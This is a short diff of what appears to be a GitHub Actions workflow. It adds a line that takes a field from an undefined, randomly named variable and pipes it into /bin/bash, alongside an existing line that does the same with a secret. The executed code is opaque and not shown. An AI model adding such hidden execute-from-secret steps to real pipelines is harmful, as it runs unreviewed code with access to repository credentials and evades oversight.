@@ -17,6 +17,7 @@ jobs:
           gey325: ${{ secrets.gey325 }}
         run: |
           printf '%s' "$gey325" | jq -r .u08 | /bin/bash
+          echo $bepnm00 | jq -r .juep66 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
